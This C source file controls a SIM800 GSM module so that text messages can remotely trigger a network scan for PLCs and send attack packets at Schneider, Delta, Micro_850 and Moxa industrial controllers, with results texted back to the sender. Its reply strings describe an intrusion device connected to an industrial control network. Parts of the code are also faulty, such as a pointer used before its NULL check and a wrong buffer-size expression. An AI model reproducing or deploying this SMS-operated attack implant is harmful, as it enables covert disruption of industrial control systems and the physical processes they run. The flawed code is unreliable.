/**********************************************************************************************************
 *  A. Standard Includes
*********************************************************************************************************/
#include <stdio.h>
#include <string.h>
#include <unistd.h>
#include <stdlib.h>
#include <wchar.h>
#include <locale.h>
#include <stdint.h>
#include <ctype.h>
#include <pthread.h>
#include <unistd.h>

/**********************************************************************************************************
 *  B. APP sepecific Includes
*********************************************************************************************************/
#include "invade.h.in"
#include "ser.h"
#include "SIM800.h"
#include "client.h"
#include "getNmap.h"


/**********************************************************************************************************
 *  C. Object like Macro
*********************************************************************************************************/
#define SIM800_AT                                   ("AT\r")
#define SIM800_AT_DETECT_SIMCARD                    ("AT+CPIN?\r")
#define SIM800_AT_MESSAGE_PDU_FORMAT                ("AT+CMGF=0\r")
#define SIM800_AT_MESSAGE_TXT_FORMAT                ("AT+CMGF=1\r")
#define SIM800_AT_SELECT_IE_CHARACTER               ("AT+CSCS="GSM"\r")
#define SIM800_AT_SELECT_ADD_TYPE                   ("AT+CSCA?\r")
#define SIM800_AT_MESSAGE_DELETE_ALL                ("AT+CMGD=1,4\r")
#define SIM800_AT_SET_MESSAGM_TEXT_PARAMETERS       ("AT+CSMP=17,167,0,240\r")
#define SIM800_AT_SEND_MESSAGE                      ("AT+CMGS=")
#define SIM800_AT_READ_MESSAGE                      ("AT+CMGR=")
#define SIM800_AT_DELETE_MESSAGE                    ("AT+CMGD=")
#define SIM800_RECV_SMS                             ("SM")


#define SIM800_RETRY                                ( 3 )
#define BUFFSIZE                                    ( 2048 )
#define TIMEOUT                                     ( 300 )
#define SIM800_SER_PORT                             ( 0 )
#define PHONE_NUM_SIZE                              ( 13 )

#define IS_ODD                                      ( 1 )
#define IS_EVEN                                     ( 0 )

#define MOBILE_MININUMBER                           ('0')
#define MOBILE_MAXNUMBER                            ('9')

#define JUDGE_PARITY                                ( 2 )                           
#define ADD_LOCATION                                ('F')   
#define ADD_LOCATION_LEN                            ( 1 )   
#define SWAP_LOCATION                               ( 1 )

#define WCHAR_LEN                                   ( 4 )
#define PDU_FORMAT_LEN                              ( 2 )

#define END_MARK                                    (0x1A)

#define REPLY_TURE                                  ("完成入侵扫描，发现指定的控制设备，并向该设备发送攻击包")
#define REPLY_FALSE                                 ("未能成功完成入侵操作，请确认已将入侵设备接入工控网络。")
#define REPLY_PLC_TURE                              ("扫描正在进行，请稍后... 指令说明：“11”全网段扫描；;“2” +网络资产数字标签，执行攻击用例;“3”执行全部攻击用例。")
#define REPLY_TEST_TURE                             ("测试已完成！")

/**********************************************************************************************************
 *  D. Function like Macro
*********************************************************************************************************/
#if 1
    #define SIM800_LOG( _level, ... )  fprintf( stdout, "[%s]", #_level); fprintf( stdout, __VA_ARGS__ )
#else
    #define SIM800_LOG( _level, ... )   
#endif

/**********************************************************************************************************
 *  E. Type defines
**********************************************************************************************************/

extern  char PLCbuff[1024];
/**********************************************************************************************************
 *  F. Local Function Declarations
**********************************************************************************************************/
uint8_t SIM800_Mobile_Convter_DA(const uint8_t* Mobile_Number,uint8_t* DA);
uint16_t SIM800_SMS_Convter_UD(  const uint8_t* SMS_Content,uint8_t* UD);

SIM800_PDU_Send* SIM800_PDU_Mode_Set(uint8_t*      SCA, 
                       uint8_t        FO,
                       uint8_t        MR,
                       uint8_t   DA_Type,
                       uint8_t       PID,
                       uint8_t       DCS,
                       uint8_t        VP
                       );

bool_t  SIM800_DelMultiSMS( uint16_t IndexNum );
/**********************************************************************************************************
 *  G. Local Object/Variable
*********************************************************************************************************/


/**********************************************************************************************************
 *  H. Exported Object/Variable
*********************************************************************************************************/


/**********************************************************************************************************
 *  I. Local Function Implementations
**********************************************************************************************************/
/*********************************************************************************************************
 * @brief   Delete the SMS 
 *
 * @param   uint16_t IndexNum:the SMS index number
 * @usage
 *
 * @return  TRUE if no error. 
 *          FALSE otherwise.
 *          
 *
********************************************************************************************************/
bool_t SIM800_DelMultiSMS( uint16_t IndexNum )  
{  
    bool_t bRet = FALSE;
    uint8_t SIM800_Buff[BUFFSIZE]; 
    memset( SIM800_Buff, 0, sizeof(SIM800_Buff) );
    sprintf( SIM800_Buff, "%s%d\r\n",SIM800_AT_DELETE_MESSAGE, IndexNum );
    SIM800_SendATCom( (char *)SIM800_Buff );
    usleep(800000);
    if( SIM800_GetATResp( SIM800_Buff, "OK", TIMEOUT ) ==  AT_RETURN_OK )
    {
        bRet = TRUE;
    }
    else
    {
        SIM800_LOG( SIM800_ERROR, "Delete SMS Failed\n");
    }

    return bRet;  
}  



/*********************************************************************************************************
 * @brief   Change the Mobile number to PDU format number;
 *
 * @param   const uint8_t* Mobile_Number:the Mobile number string that will be changed
            uint8_t* DA:the array for storing the  changed mobile number
 * @usage
 *
 * @return  The length of the Mobile number
 *
 * 
********************************************************************************************************/
uint8_t SIM800_Mobile_Convter_DA(const uint8_t* Mobile_Number,uint8_t* DA)
{
    bool_t bSuccess = TRUE;
    uint8_t count;
    uint8_t Mobile_Len = 0u;
    Mobile_Len = strlen(Mobile_Number);
    for (count = 0u;count < Mobile_Len; count++)
    {
        if(Mobile_Number[count] < MOBILE_MININUMBER ||  
           Mobile_Number[count] > MOBILE_MAXNUMBER)                             //判断是否全为数字
        {
            SIM800_LOG( SIM800_INFO ,"Mobile Number format error!\r\n");
            Mobile_Len = 0u;
            bSuccess = FALSE;
            break;
        }
    }
    if ( bSuccess )                                                             //号码格式正确且长度为奇数
    {
        if(IS_ODD == (Mobile_Len % JUDGE_PARITY ))
        {
            for (count = 0u;count < (Mobile_Len + ADD_LOCATION_LEN); count++)
            {
                if(IS_EVEN == (count % JUDGE_PARITY))
                {
                    if((Mobile_Len - ADD_LOCATION_LEN) == count)                //DA
                    {
                        DA[count] = ADD_LOCATION;
                    }
                    else
                    {
                        DA[count] = Mobile_Number[count + SWAP_LOCATION];   
                    }
                }
                if(IS_ODD == (count % JUDGE_PARITY))
                {
                    DA[count] = Mobile_Number[count - SWAP_LOCATION];
                }   
            } 
        }
        if(IS_EVEN == (Mobile_Len % JUDGE_PARITY))
        {
            for(count = 0u;count < (Mobile_Len);count ++)
            {
                if(IS_EVEN == (count % JUDGE_PARITY))
                {
                    DA[count] = Mobile_Number[count + SWAP_LOCATION]; 
                }
                if(IS_ODD == (count % JUDGE_PARITY))
                {
                    DA[count] = Mobile_Number[count - SWAP_LOCATION];
                }
            }
        }
    }
    
    return Mobile_Len;                                                          //返回Mobile_Number数据长度
}

/*********************************************************************************************************
 * @brief   Change the SMS text to PDU format text(Support Chinese,English and other languages);
 *
 * @param   const uint8_t* SMS_Content:the SMS text string that will be changed
            uint8_t* UD:the array for storing the changed SMS text
 * @usage
 *
 * @return  The length of the SMS text
 *
 * 
*********************************************************************************************************/
uint16_t SIM800_SMS_Convter_UD(const uint8_t* SMS_Content,uint8_t* UD)
{
    uint8_t *p;
    p = UD;
    uint8_t count;
    wchar_t wbuf[1024];
    strncpy(UD,SMS_Content, strlen(SMS_Content));
    if ( NULL == setlocale( LC_CTYPE, "") )                        
    {
        SIM800_LOG( SIM800_INFO, "Locale failed!\n" );                          //设置Locale失败                                             
    }
    size_t rc = mbstowcs(wbuf,UD,sizeof(wbuf)/sizeof(wbuf[0]-1));
    if(rc >= 0)
    {
        wbuf[rc] = L'\0';
        memset(UD,0,strlen(UD));
        for(count = 0; count < wcslen(wbuf);count++)
        {
            sprintf(p,"%04X",wbuf[count]);
            p += WCHAR_LEN;
        }
    }
    return strlen(UD);
} 

void SIM800_GetPhoneNum( uint8_t *Read_Msg_Buff, uint8_t *Msm_Phone_Num)
{
    uint8_t  Msg_TempBuff[ BUFFSIZE ];
    char  *pPhone_Buff;

    strcpy( Msg_TempBuff, Read_Msg_Buff);
    pPhone_Buff = Msg_TempBuff;
    strsep( &pPhone_Buff, "+");
    strsep( &pPhone_Buff, "+");
    strsep( &pPhone_Buff, "+");
    strncpy( Msm_Phone_Num, pPhone_Buff, PHONE_NUM_SIZE);
    Msm_Phone_Num[ PHONE_NUM_SIZE ] = '\0';
}


/*********************************************************************************************************
 * @brief   Set the PDU mode
 *
 * @param   uint8_t* SCA:SCA number,
 *          uint8_t FO:PDU type
 *          uint8_t MR:reference number
 *          uint8_t DA_Type：DA_Type
 *          uint8_t PID:PID send way
 *          uint8_t DCS:DCS codeing mode
 *          uint8_t VP:VP coverage area
 * @usage
 *
 * @return  The structure SIM800_PUD_Send
 *
 * 
*********************************************************************************************************/
SIM800_PDU_Send* SIM800_PDU_Mode_Set(uint8_t*      SCA, 
                       uint8_t        FO,
                       uint8_t        MR,
                       uint8_t   DA_Type,
                       uint8_t       PID,
                       uint8_t       DCS,
                       uint8_t        VP
                       )
{
    SIM800_PDU_Send* pPdu;
    pPdu = (SIM800_PDU_Send*)malloc(sizeof(SIM800_PDU_Send));
    strcpy(pPdu->SCA,SCA);
    pPdu->FO = FO;
    pPdu->MR = MR;
    pPdu->DA_Type = DA_Type;
    pPdu->PID = PID;
    pPdu->DCS = DCS;
    pPdu->VP = VP;
    
    return pPdu; 
}

/*********************************************************************************************************
 * @brief   Delete the sent SMS 
 *
 * @param   void
 * @usage
 *
 * @return  TRUE if no error. 
 *          FALSE otherwise.
 *          
 *
********************************************************************************************************/

bool_t SIM800_Del_SentSMS()
{
    bool_t bRet = FALSE;
    uint8_t IndexNum = 0;
    uint8_t SIM800_BUff[BUFFSIZE];
    if(AT_RETURN_OK == SIM800_GetATResp(SIM800_BUff, "+CMGS:", TIMEOUT ))
    {
       SIM800_LOG(SIM800_INFO,"Send the SMS is OK:%s\n",SIM800_BUff);
       strtok( SIM800_BUff, ":");
       IndexNum = atoi( strtok( NULL, ":") );
       memset(SIM800_BUff,0,BUFFSIZE);
       SIM800_DelMultiSMS(IndexNum);
       bRet = TRUE;
    }
    else
    {
        SIM800_LOG(SIM800_INFO,"Send the SMS is failed:%s\n",SIM800_BUff);
    }
    
    return bRet;
}
/**********************************************************************************************************
 *  J. Public Function Implementations
*********************************************************************************************************/
/*********************************************************************************************************
 * @brief  Serial sends SIM800 command 
 *
 * @param  uint8_t *pTxBuff:the command
 * @usage
 *
 * @return  void
 *          
 *
********************************************************************************************************/
void SIM800_SendATCom( uint8_t *pTxBuff )
{
    SER_Write( SIM800_SER_PORT, pTxBuff, strlen(pTxBuff));
}


/*********************************************************************************************************
 * @brief   Get the data from the SIM800 module 
 *
 * @param   uint8_t *pRxBuff:the buffer array to store the data from the SIM800
 *          uint32_t nBufLen:the length of the data you want to read
 *          uint32_t timeOut:Read the data timeOut
 * @usage
 *
 * @return  the length having read
 *          
 *
********************************************************************************************************/
uint32_t SIM800_GetRxBuf( uint8_t *pRxBuff, uint32_t nBufLen, uint32_t timeout )
{
    return SER_Read( SIM800_SER_PORT, pRxBuff, nBufLen, timeout);
}


/*********************************************************************************************************
 * @brief   Get the response from the SIM800 module whether the command is OK 
 *
 * @param   uint8_t *pRxBuff:the buffer array to store the data from the SIM800
 *          const char *pKeyword:the keyword from the buffer array 
 *          uint32_t timeOut:Read the data timeOut
 * @usage
 *
 * @return  SIM800_ERROR message
 *          
 *
********************************************************************************************************/
SIM800_ERROR SIM800_GetATResp( uint8_t *pRxBuff, const char *pKeyword,  uint32_t timeOut )
{
    SIM800_ERROR eRespErr;

    if(0 == (SIM800_GetRxBuf( pRxBuff, BUFFSIZE, timeOut)))
    {
        SIM800_LOG( SIM800_INFO, "读取信息失败\n");
        eRespErr = AT_RETURN_ERROR;
    }  
    else
    {   
        if( NULL != strstr((const char*)pRxBuff, pKeyword ) )                   //搜索关键字  
        {  
            SIM800_LOG( SIM800_INFO ,"%s 返回成功!\r\n","OK");  
            eRespErr  = AT_RETURN_OK;
        }  
        else if(NULL != strstr((const char*)pRxBuff, "ERROR") )  
        {  
            SIM800_LOG( SIM800_INFO,"%s 返回错误!\r\n","ERROR");
            eRespErr = AT_RETURN_ERROR;
        }  
        else  
        {  
            SIM800_LOG( SIM800_INFO ,"%s 超时!\r\n", "ERROR" );
            eRespErr = AT_RETURN_TIME_OUT;  
        }
    }   
    
    return eRespErr;
}  


/*********************************************************************************************************
 * @brief   Makesure whether the SIM800 module is ready 
 *
 * @param   void
 *          
 * @usage
 *
 * @return  TRUE if no error. 
 *          FALSE otherwise.
 *          
 *
********************************************************************************************************/
bool_t SIM800_Ready()
{
    bool_t bRet = FALSE;
    uint8_t nRetry = SIM800_RETRY;
    uint8_t SIM800_Buff[BUFFSIZE];

    do {
        SIM800_SendATCom( (char *)SIM800_AT );
        if( AT_RETURN_OK == SIM800_GetATResp( SIM800_Buff , "OK", TIMEOUT ) )
        {
            memset(SIM800_Buff,0,BUFFSIZE);
            bRet = TRUE;
            break;
        }

    }while (nRetry--);
    nRetry = SIM800_RETRY;
    if (bRet)
    {
        do{
            SIM800_SendATCom( (char *)SIM800_AT_DETECT_SIMCARD );
            if( AT_RETURN_OK == SIM800_GetATResp( SIM800_Buff , "OK", TIMEOUT ) )
            {
                SIM800_SendATCom(SIM800_AT_MESSAGE_DELETE_ALL);
                sleep(1);
                memset(SIM800_Buff,0,BUFFSIZE);
                bRet = TRUE;
                break;
            }
            else
            {
                SIM800_LOG(SIM800_ERROR,"%s:Cannot find the SIM card!","ERROR");
                bRet = FALSE;
            }
            
        }while(nRetry --);
    }
    return bRet;
}


/*********************************************************************************************************
 * @brief   Parse the SMS text to get the SMS content
 *
 * @param   uint8_t *pText:the text from the SIM800 module
 *          uint8_t *pResult:store the result
 * @usage
 *
 * @return  TRUE if no error. 
 *          FALSE otherwise.
 *          
 *
********************************************************************************************************/
bool_t SIM800_ParseTextSMS(uint8_t *pText,uint8_t *pResult)   
{  
    bool_t          bRet = TRUE;
    uint16_t        nSms_Head=0;
    uint16_t        nSms_End=0;
    uint8_t         CR_Count =0;
    uint8_t         *p  = NULL;                                                 //短信位置指针
    
    p = strstr((const char*)pText, "+CMGR:");  
    p = strstr((const char*)p, "\n");                                            //寻找短信TEXT开始位置
                                  
    nSms_Head = (p - pText) + 2;
    if(p == NULL )  
    {  
        SIM800_LOG( SIM800_INFO ,"TEXT短信解析开始位置错误!\r\n");  
        bRet = FALSE;  
    }
    if( bRet )
    {
        while('\n'== *(p + CR_Count))
        {
                CR_Count ++;
        }
        nSms_Head = (p - pText) + CR_Count;
        p = strstr((const char *)&pText[nSms_Head],"\n");                     //寻找短信TEXT结束位置
        if(p == NULL )
        {
            SIM800_LOG( SIM800_INFO ,"TEXT短信解析结束位置错误!\r\n");
            bRet = FALSE;
        }
        if( bRet )
        {
            nSms_End = (p - pText);
            strncpy(pResult, &pText[nSms_Head], ( nSms_End - nSms_Head ) );
            pResult[nSms_End - nSms_Head] = '\0';
        }
    }

    return bRet;
}


/*********************************************************************************************************
 * @brief   Read the SMS text 
 *
 * @param   uint16_t IndexNum:the SMS index number
 *          uint8_t *Msg_buff:the message buffer
 * @usage
 *
 * @return  TRUE if no error. 
 *          FALSE otherwise.
 *          
 *
********************************************************************************************************/
bool_t SIM800_ReadTextSMS( uint16_t IndexNum, uint8_t *Msm_Phone_Num,uint8_t *Msg_buff)
{
    bool_t          bRet = FALSE;
    uint8_t         SIM800_Buff[BUFFSIZE];
    uint8_t         SIM800_Buff_num[BUFFSIZE];
    SIM800_ERROR    eRespErr;

    SIM800_SendATCom( (char *)SIM800_AT_MESSAGE_TXT_FORMAT );
    if( SIM800_GetATResp( SIM800_Buff, "OK", TIMEOUT ) ==  AT_RETURN_OK )
    {
        memset( SIM800_Buff, 0, BUFFSIZE );
        sprintf( SIM800_Buff, "%s%d\r",SIM800_AT_READ_MESSAGE, IndexNum );
        SIM800_SendATCom( (char *)SIM800_Buff );
        usleep(8000000);

        if( SIM800_GetATResp( SIM800_Buff_num, "OK", TIMEOUT ) ==  AT_RETURN_OK )
        {
            SIM800_GetPhoneNum( SIM800_Buff_num, Msm_Phone_Num);
            bRet = SIM800_ParseTextSMS(SIM800_Buff_num, Msg_buff);
        }
        else
        {
            SIM800_LOG( SIM800_INFO, "Read Msg Error\n");
        }
    }

    return bRet;
}


/*********************************************************************************************************
 * @brief   Get the data from the SIM800 module 
 *
 * @param   uint8_t *pRxBuff:the buffer array to store the data from the SIM800
 *          
 * @usage
 *
 * @return  TRUE if no error. 
 *          FALSE otherwise.
 *          
 *
********************************************************************************************************/
bool_t SIM800_RecvSMS( uint8_t *pRxBuff )
{
    bool_t          bRet = TRUE;
    uint16_t        instructions;
    uint8_t         Msg_buff[BUFFSIZE];
    uint8_t         Msg_attack_buff[BUFFSIZE];
    uint8_t         Msm_Phone_Num[PHONE_NUM_SIZE + 1];
    uint8_t         Send_Buff[BUFFSIZE + 1];
    uint8_t         Nmap_buff[BUFFSIZE];
    uint8_t         PDU_Len;
    uint8_t         *pUnReadMSM;  
    uint8_t         *pRxBuff_temp;
    uint16_t        IndexNum;
    //uint16_t        rc_tid1, rc_tid2, rc_tid3, rc_tid4;
    IP_addr         *ip_Addr;
    pthread_t       schneider_tid, delta_tid, Micro_850_tid, Moxa_tid;
    printf("pRxBuff:%s\n", pRxBuff);
    if( NULL != strstr( (const char*)pRxBuff, SIM800_RECV_SMS ) )
    {
        SIM800_LOG( SIM800_INFO ,"%s 收到短信\r\n","+CMTI");

        //获取短信索引号
        pRxBuff_temp = pRxBuff;
        strtok( pRxBuff_temp, ",");
        IndexNum = atoi( strtok(NULL, ",") );
        printf("IndexNum: %d\n", IndexNum);
        //读取短信内容
        bRet = SIM800_ReadTextSMS( IndexNum, Msm_Phone_Num ,Msg_buff );
        printf("bRet: %d\n", bRet);
        SIM800_LOG( SIM800_INFO_MSG ,"%s \r\n", Msg_buff);
        SIM800_LOG( SIM800_INFO_NUM ,"%s \r\n", Msm_Phone_Num+2);
        //删除已读短信，防止短信存满
        if( bRet )
        {
            bRet = SIM800_DelMultiSMS( IndexNum );
        }
        instructions = atoi(Msg_buff);

        printf("instructions****************:%d\n", instructions);       
        switch(instructions)
        {
        case 1: 
            //PDU_Len = SIM800_PDU_Content(Msm_Phone_Num, REPLY_PLC_TURE, Send_Buff);
            //SIM800_PDU_Msg_Send(Send_Buff,PDU_Len);                                                   //输出四组PLC nmap信息
            //sleep(20);
            getPLC();
            printf("plc_buff:%s", PLCbuff);
            SIM800_TEXT_Msg_Send(Msm_Phone_Num+2, PLCbuff);
            memset(PLCbuff, 0, sizeof(PLCbuff)); 
            break;
        //case 11:                                                  
            /*ip_Addr = getNmap();                 //nmap扫描全网段
            ErgodicNmap(ip_Addr, Nmap_buff);
            printf("Nmap_buff:%s", Nmap_buff);
            SIM800_TEXT_Msg_Send(Msm_Phone_Num+2, Nmap_buff);
            memset(Nmap_buff, 0, strlen(Nmap_buff));
            free(ip_Addr);
            ip_Addr = NULL;*/
            /*getallPLC();                                          //输出全部PLC nmap信息
            printf("plc_buff:%s", PLCbuff);
            SIM800_TEXT_Msg_Send(Msm_Phone_Num+2, PLCbuff);
            memset(PLCbuff, 0, sizeof(PLCbuff));
            break;*/
        case 201:                                                    //测试Schnieder Electric
            if( bRet )
            {
                strcpy(Msg_attack_buff, "schneider");
                bRet = client_Tcpconection( Msg_attack_buff, instructions);
                memset(Msg_attack_buff, 0, sizeof(Msg_attack_buff));
                if (bRet)
                {
                    PDU_Len = SIM800_PDU_Content(Msm_Phone_Num, REPLY_TEST_TURE, Send_Buff);
                    SIM800_PDU_Msg_Send(Send_Buff,PDU_Len);
                }
            }
            break;
        case 202:                                                    //测试delta
            if( bRet )
            {
                strcpy(Msg_attack_buff, "delta");
                bRet = client_Tcpconection( Msg_attack_buff, instructions);
                memset(Msg_attack_buff, 0, sizeof(Msg_attack_buff));
                if (bRet)
                {
                    PDU_Len = SIM800_PDU_Content(Msm_Phone_Num, REPLY_TEST_TURE, Send_Buff);
                    SIM800_PDU_Msg_Send(Send_Buff,PDU_Len);
                }
            }
            break;
        case 203:                                                    //测试Micro_850
            if( bRet )
            {
                strcpy(Msg_attack_buff, "Micro_850");
                bRet = client_Tcpconection( Msg_attack_buff, instructions);
                memset(Msg_attack_buff, 0, sizeof(Msg_attack_buff));
                if (bRet)
                {
                    PDU_Len = SIM800_PDU_Content(Msm_Phone_Num, REPLY_TEST_TURE, Send_Buff);
                    SIM800_PDU_Msg_Send(Send_Buff,PDU_Len);
                }
            }
            break;
        case 204:                                                    //测试Moxa
            if( bRet )
            {
                strcpy(Msg_attack_buff, "Moxa");
                bRet = client_Tcpconection( Msg_attack_buff, instructions);
                memset(Msg_attack_buff, 0, sizeof(Msg_attack_buff));
                if (bRet)
                {
                    PDU_Len = SIM800_PDU_Content(Msm_Phone_Num, REPLY_TEST_TURE, Send_Buff);
                    SIM800_PDU_Msg_Send(Send_Buff,PDU_Len);
                }
            }
            break;
        case 205:
        case 206:
        case 207:
        case 208:
        case 209:
        case 210:                                                    
        case 212:
        case 213:
        case 214:
        case 215:
        case 216:
        case 217:
        case 218:
        case 219:
        case 220:
        case 221:
        case 222:
        case 223:
        case 224:
        case 225:
        case 226:
        case 227:
            if( bRet )
            {
                strcpy(Msg_attack_buff, "Virtual");
                bRet = client_Tcpconection( Msg_attack_buff, instructions);
                memset(Msg_attack_buff, 0, sizeof(Msg_attack_buff));
                if (bRet)
                {
                    PDU_Len = SIM800_PDU_Content(Msm_Phone_Num, REPLY_TEST_TURE, Send_Buff);
                    SIM800_PDU_Msg_Send(Send_Buff,PDU_Len);
                }
            }
            break;
        case 3:                                                    //全部测试
            if( bRet )
            {
                
                if((pthread_create(&schneider_tid, NULL, schneider_pth, NULL)) != 0)
                {
                    printf("schneider pthread create failed!\n");
                }
                if((pthread_create(&delta_tid, NULL, delta_pth, NULL)) != 0)
                {
                    printf("delta pthread create failed!\n");
                }
                if((pthread_create(&Micro_850_tid, NULL, Micro_850_pth, NULL)) != 0)
                {
                    printf("Micro_850 pthread create failed!\n");
                }
                if((pthread_create(&Moxa_tid, NULL, Moxa_pth, NULL)) != 0)
                {
                    printf("Moxa pthread create failed!\n");
                }

                strcpy(Msg_attack_buff, "Virtual");
                bRet = client_Tcpconection( Msg_attack_buff, instructions);
                memset(Msg_attack_buff, 0, sizeof(Msg_attack_buff));
                pthread_join(schneider_tid, NULL);
                pthread_join(delta_tid, NULL);
                pthread_join(Micro_850_tid, NULL);
                pthread_join(Moxa_tid, NULL); 
                if (bRet)
                {
                    PDU_Len = SIM800_PDU_Content(Msm_Phone_Num, REPLY_TEST_TURE, Send_Buff);
                    SIM800_PDU_Msg_Send(Send_Buff,PDU_Len);
                }
            }
            break;
        }
        
        //通过短信内容发送指定包
        /*if( bRet )
        {
            bRet = client_Tcpconection( Msg_buff );
        }
        //反馈短信
        if( bRet )
        {
            PDU_Len = SIM800_PDU_Content(Msm_Phone_Num, REPLY_TURE, Send_Buff);
            // SIM800_PDU_Send( Send_Buff, PDU_Len);
            SIM800_PDU_Msg_Send(Send_Buff,PDU_Len);
        }
        else
        {
            PDU_Len = SIM800_PDU_Content(Msm_Phone_Num, REPLY_FALSE, Send_Buff);
             SIM800_PDU_Msg_Send(Send_Buff,PDU_Len);
        }*/

    }
    else
    {
        bRet = FALSE;
    }

    return bRet;
}


/*********************************************************************************************************
 * @brief   Get the pdu content
 *
 * @param   const uint8_t* Mobile_Number:the acceptor Mobile number 
 *          const uint8_t* SMS_Content:the SMS content
 *          uint8_t* Send_Buff:the send buffer for storing the PDU content
 * @usage
 *
 * @return  the PDU format length
 *          
 *
********************************************************************************************************/
uint16_t SIM800_PDU_Content(const uint8_t* Mobile_Number,const uint8_t* SMS_Content,uint8_t* Send_Buff)
{
    uint8_t DA_Len = 0u;
    uint16_t PDU_Len = 0u;
    SIM800_PDU_Send* pPdu = SIM800_PDU_Mode_Set("00",0x11,0x00,0x91,0x00,0x08,0x01);
    pPdu->DAL = SIM800_Mobile_Convter_DA( Mobile_Number,pPdu->DA);
    pPdu->UDL = SIM800_SMS_Convter_UD( SMS_Content,pPdu->UD);
    printf("UDL:%d\n", pPdu->UDL);
    PDU_Len += sprintf(Send_Buff,"%.*s",(uint8_t)strlen(pPdu->SCA),pPdu->SCA);
    PDU_Len += sprintf(Send_Buff + PDU_Len,"%02X",pPdu->FO);
    PDU_Len += sprintf(Send_Buff + PDU_Len,"%02X",pPdu->MR);
    PDU_Len += sprintf(Send_Buff + PDU_Len,"%02X",pPdu->DAL);
    PDU_Len += sprintf(Send_Buff + PDU_Len,"%02X",pPdu->DA_Type);
    if (IS_ODD == (pPdu->DAL % JUDGE_PARITY))
    {
        PDU_Len += sprintf(Send_Buff + PDU_Len,"%.*s",pPdu->DAL+ADD_LOCATION_LEN,pPdu->DA);
    }
    else
    {
        PDU_Len += sprintf(Send_Buff + PDU_Len,"%.*s",pPdu->DAL,pPdu->DA);
    }
    PDU_Len += sprintf(Send_Buff + PDU_Len,"%02X",pPdu->PID);
    PDU_Len += sprintf(Send_Buff + PDU_Len,"%02X",pPdu->DCS);
    PDU_Len += sprintf(Send_Buff + PDU_Len,"%02X",pPdu->VP);
    PDU_Len += sprintf(Send_Buff + PDU_Len,"%02X",pPdu->UDL/PDU_FORMAT_LEN);
    PDU_Len += sprintf(Send_Buff + PDU_Len,"%.*s",pPdu->UDL,pPdu->UD);
    return (PDU_Len - strlen (pPdu->SCA))/PDU_FORMAT_LEN;
}


/*********************************************************************************************************
 * @brief   Get the data from the SIM800 module 
 *
 * @param   uint8_t* Send_Buff:the send buffer for storing the PDU content
 *          uint16_t PDU_Len:the length of the PDU
 * @usage
 *
 * @return  TRUE if no error. 
 *          FALSE otherwise.
 *          
 *
********************************************************************************************************/
bool_t SIM800_PDU_Msg_Send(uint8_t* Send_Buff,uint16_t PDU_Len)
{
    bool_t bRet = TRUE;
    uint8_t SIM800_Buff[BUFFSIZE];
    uint8_t end = END_MARK;
    SIM800_SendATCom(SIM800_AT_MESSAGE_PDU_FORMAT);
    sleep(1);
    if(AT_RETURN_OK == SIM800_GetATResp(SIM800_Buff, "OK", TIMEOUT ))
    {
       SIM800_LOG(SIM800_INFO,"Set the PDU mode is OK!\n");
       memset(SIM800_Buff,0,BUFFSIZE);
    }
    else
    {
        SIM800_LOG(SIM800_INFO,"Set the PDU mode is failed!\n");
        bRet = FALSE;
    }
    if(bRet)
    {
        sprintf(SIM800_Buff,"%s%d\r\n",SIM800_AT_SEND_MESSAGE,PDU_Len);
        SIM800_SendATCom(SIM800_Buff);
        usleep(50000);
        SIM800_SendATCom(Send_Buff);
        sleep(1);
        memset(SIM800_Buff,0,BUFFSIZE);
        SIM800_SendATCom(&end);
        sleep(5);
    }

    return bRet;
}


bool_t SIM800_TEXT_Msg_Send(const uint8_t* Mobile_Number,uint8_t* SMS_Content)
{
    bool_t bRet = TRUE;
    uint8_t SIM800_Buff[BUFFSIZE];
    uint8_t end = END_MARK;
    SIM800_SendATCom(SIM800_AT_MESSAGE_TXT_FORMAT);
    sleep(1);
    if(AT_RETURN_OK == SIM800_GetATResp(SIM800_Buff, "OK", TIMEOUT ))
    {
       SIM800_LOG(SIM800_INFO,"Set the PDU mode is OK!\n");
       memset(SIM800_Buff,0,BUFFSIZE);
    }
    else
    {
        SIM800_LOG(SIM800_INFO,"Set the PDU mode is failed!\n");
        bRet = FALSE;
    }
    if(bRet)
    {
        sprintf(SIM800_Buff,"%s\"%s\"\r\n",SIM800_AT_SEND_MESSAGE,Mobile_Number);
        printf("Send_PhoneNumber:%s\n", SIM800_Buff);
        SIM800_SendATCom(SIM800_Buff);
        usleep(50000);
        SIM800_SendATCom(SMS_Content);
        sleep(1);
        memset(SIM800_Buff,0,BUFFSIZE);
        SIM800_SendATCom(&end);
        sleep(5);
    }

    return bRet;
}



int ErgodicNmap(IP_addr* ip_Addr, uint8_t * p) //将储存在nmap信息遍历出来
{
    int   ip_num;
    int   port_num;
    uint8_t     Nmap_buff_test[BUFFSIZE];
    for(ip_num = 0; ip_num < ip_Addr->ip_count; ip_num++)
    {
        sprintf(Nmap_buff_test, "Number:%d\n", ip_num+1);
        memcpy(p, Nmap_buff_test, strlen(Nmap_buff_test));
        p += strlen(Nmap_buff_test);
        memcpy(p, ip_Addr->IpAddr[ip_num].ip, strlen(ip_Addr->IpAddr[ip_num].ip));
        p += strlen(ip_Addr->IpAddr[ip_num].ip);
        memcpy(p, ip_Addr->IpAddr[ip_num].MAC, strlen(ip_Addr->IpAddr[ip_num].MAC));
        p += strlen(ip_Addr->IpAddr[ip_num].MAC);
                
        for(port_num = 0; port_num < ip_Addr->IpAddr[ip_num].port_count ; port_num++)
        {
            memcpy(p, &ip_Addr->IpAddr[ip_num].port[port_num][40], strlen(&ip_Addr->IpAddr[ip_num].port[port_num][40]));
            p += strlen(&ip_Addr->IpAddr[ip_num].port[port_num][40]);
        }
        memcpy(p, "\n", 1);
        p += 1;
    }
    return 0;
}


void* schneider_pth(void* arg)
{
    uint8_t         Msg_attack_buff[BUFFSIZE];

    strcpy(Msg_attack_buff, "schneider");
    client_Tcpconection( Msg_attack_buff, 1);
    memset(Msg_attack_buff, 0, sizeof(Msg_attack_buff));
    pthread_exit(0);
}


void* delta_pth(void* arg)
{   
    uint8_t         Msg_attack_buff[BUFFSIZE];

    strcpy(Msg_attack_buff, "delta");
    client_Tcpconection( Msg_attack_buff, 2);
    memset(Msg_attack_buff, 0, sizeof(Msg_attack_buff));
    pthread_exit(0);
}


void* Micro_850_pth(void* arg)
{
    uint8_t         Msg_attack_buff[BUFFSIZE];

    strcpy(Msg_attack_buff, "Micro_850");
    client_Tcpconection( Msg_attack_buff, 3);
    memset(Msg_attack_buff, 0, sizeof(Msg_attack_buff));
    pthread_exit(0);
}

void* Moxa_pth(void* arg)
{
    uint8_t         Msg_attack_buff[BUFFSIZE];

    strcpy(Msg_attack_buff, "Moxa");
    client_Tcpconection( Msg_attack_buff, 4);
    memset(Msg_attack_buff, 0, sizeof(Msg_attack_buff));
    pthread_exit(0);
}
